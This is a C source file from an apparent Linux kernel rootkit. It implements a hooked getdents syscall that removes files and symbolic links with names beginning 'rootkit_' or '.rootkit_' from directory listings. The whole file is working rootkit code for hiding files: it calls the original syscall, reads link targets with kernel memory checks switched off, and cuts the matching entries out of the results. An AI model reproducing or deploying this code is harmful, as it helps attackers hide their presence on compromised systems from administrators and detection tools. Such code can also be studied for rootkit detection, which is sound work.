/*
 * This file contains everything needed for the manipulated
 * getdents syscall.
 */
#include <asm/uaccess.h>

#include "include.h"
#include "main.h"


/* Check whether we need to hide this file */
int hide(char *d_name)
{
	if(strstr(d_name, "rootkit_") == d_name) 
	{
		return 1;
	}
	else if(strstr(d_name, ".rootkit_") == d_name)
	{
		return 1;
	}

	return 0;
}

/* 
 * Checks whether a linux_dirent is a symbolic link and if it is
 * checks whether we need to hide it, too.
 */
int check_symlink(char *path)
{
	char *ptr, *name;
	char delimiter = '/';
	
	ptr = strrchr(path, delimiter);
	name = ptr + 1;
	
	if(ptr == NULL)
	{
		return 0;
	}

	return hide(name);
}

/*
 * Our manipulated getdents syscall. It checks whether a particular file needs to be hidden.
 * If it matches then don't show, otherwise works normally and calls the original getdents.
 */
asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
	getdents_call_counter++;
	/* nothing else above this line */
	
	mm_segment_t old_fs;
	char lpath[128];
	size_t lpath_len;
	
	long ret;
	int len = 0;
	int tlen = 0;

	ret = (*original_getdents) (fd,dirp,count);	
	tlen = ret;
		
	while(tlen>0)
	{
		len  = dirp->d_reclen;
		tlen = tlen-len;
		memset(lpath, 0, 128);	
		
		/* tell the kernel to ignore kernel-space memory in syscalls */
		old_fs = get_fs();
		set_fs(KERNEL_DS);
		
		/* execute our readlinkat syscall */
		lpath_len = (*syscall_readlinkat) (fd, dirp->d_name, lpath, 128);
		
		/* reset the kernel */	
		set_fs(old_fs);
		
		/* terminate the string properly */	
		memset(lpath+lpath_len, '\0', 1);	

		/* Check if we need to hide this symlink (only if it is a symlink ofc) */
		if(lpath_len > 0 && check_symlink(lpath))
		{
			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
			ret -= len;
		}	
		/* Check if we need to hide this file */
		else if(hide(dirp->d_name))
		{	
			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
			ret -= len;
		}
		else if(tlen != 0)
		{
			dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
		}

	}
	
	/* nothing else below this line */
	getdents_call_counter--;
	return ret;
}



